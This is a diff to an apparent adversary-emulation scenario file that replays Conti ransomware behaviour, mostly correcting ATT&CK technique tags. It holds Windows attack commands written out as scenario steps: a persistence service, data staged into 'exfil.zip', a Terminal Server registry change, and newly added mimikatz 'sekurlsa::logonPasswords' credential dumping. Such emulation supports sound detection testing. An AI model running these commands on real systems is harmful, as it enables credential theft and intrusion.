@@ -180,7 +180,7 @@
                 "module": "run",
                 "request": "cmd /c sc.exe create Conti binpath= c:\\windows\\system32\\Conti.exe type= share start= auto",
                 "rtags": [
-                    "att&ck-technique:T1569.002"
+                    "att&ck-technique:T1543.003"
                 ],
                 "type": "message"
             },
@@ -218,7 +218,7 @@
                 "module": "run",
                 "request": "powershell mkdir \"%USERPROFILE%\\Desktop\\Conti\"",
                 "rtags": [
-                    "att&ck-technique:T1074"
+                    "att&ck-technique:T1059.001"
                 ],
                 "type": "message"
             },
@@ -226,6 +226,9 @@
                 "depends_on": "e96eccc9-6c98-4246-b809-1849684c7df2",
                 "module": "file",
                 "request": "--create --path \"%USERPROFILE%\\Desktop\\Conti\\target_file.doc\" --size 1MB --count 100 --random",
+                "rtags": [
+                    "att&ck-technique:T1074.001"
+                ],
                 "type": "message"
             },
             "29": {
@@ -233,7 +236,7 @@
                 "module": "run",
                 "request": "powershell \"Compress-Archive -Path $env:userprofile\\Desktop\\Conti -CompressionLevel Optimal -Destination $env:userprofile\\Desktop\\exfil.zip\"",
                 "rtags": [
-                    "att&ck-technique:T1074.001"
+                    "att&ck-technique:T1560.002"
                 ],
                 "type": "message"
             },
@@ -267,7 +270,9 @@
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "powershell notepad \"%USERPROFILE%\\Desktop\\readme.txt\"",
-                "rtags": [],
+                "rtags": [
+                    "att&ck-technique:T1059.001"
+                ],
                 "type": "message"
             },
             "34": {
@@ -304,7 +309,7 @@
             },
             "39": {
                 "function": "ifelse",
-                "next": "44",
+                "next": "46",
                 "step": "38",
                 "type": "decision",
                 "value": "High",
@@ -314,7 +319,9 @@
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd.exe /C reg add \"hklm\\system\\currentControlSet\\Control\\Terminal Server\" /v \"fDenyTSConnections\" /t REG_DWORD /d 0x1 /f",
-                "rtags": [],
+                "rtags": [
+                    "att&ck-technique:T1112"
+                ],
                 "type": "message"
             },
             "41": {
@@ -343,6 +350,21 @@
                 "type": "message"
             },
             "44": {
+                "module": "loader",
+                "module_to_load": "mimikatz",
+                "request": "--load mimikatz",
+                "type": "message"
+            },
+            "45": {
+                "depends_on": "acc295cf-e232-4a4d-9210-1a6911beb4f8",
+                "module": "mimikatz",
+                "request": "--arglist sekurlsa::logonPasswords",
+                "rtags": [
+                    "att&ck-technique:T1003.001"
+                ],
+                "type": "message"
+            },
+            "46": {
                 "module": "controller",
                 "request": "--shutdown",
                 "rtags": [
